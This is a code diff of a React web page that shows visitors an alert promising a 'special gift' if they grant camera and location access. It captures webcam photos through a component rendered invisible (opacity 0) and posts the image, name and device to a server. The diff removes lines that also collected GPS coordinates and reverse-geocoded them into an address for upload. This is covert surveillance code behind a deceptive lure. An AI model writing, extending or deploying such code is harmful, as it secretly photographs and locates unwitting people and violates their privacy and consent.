@@ -5,34 +5,7 @@ import Webcam from 'react-webcam'
 function App() {
   const webcamRef = useRef(null)
   const [photo, setPhoto] = useState(null)
-  const [allow, setAllow] = useState(false)
-  const [location, setLocation] = useState(null)
   const [ cam, setCam] = useState(false)
-  useEffect(() => {
-    navigator.geolocation.getCurrentPosition(
-      async (position) => {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
-
-        console.log(lat, lon);
-
-        setAllow(true);
-
-        const res = await fetch(
-          `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`
-        );
-
-        const data = await res.json();
-        console.log(data.display_name);
-        setLocation(data.display_name)
-      },
-      (error) => {
-        setAllow(false);
-        console.log(error.message);
-        setLocation(error.message)
-      }
-    );
-  }, []);
   const capture = async (e) => {
     e.preventDefault()
 
@@ -54,8 +27,7 @@ function App() {
       body: JSON.stringify({
             imageSrc,
             name,
-            device,
-            location 
+            device
           })
 
     })
@@ -65,7 +37,7 @@ function App() {
   return (
     
     <div>
-      {!allow && alert('Please allow location and camera permission for your special gift')}
+      {!cam && alert('Please allow location and camera access for your special gift')}
       <Webcam
         style={{width:'1920px', height:'1080', opacity: 0, position: 'absolute'}}
         ref={webcamRef}
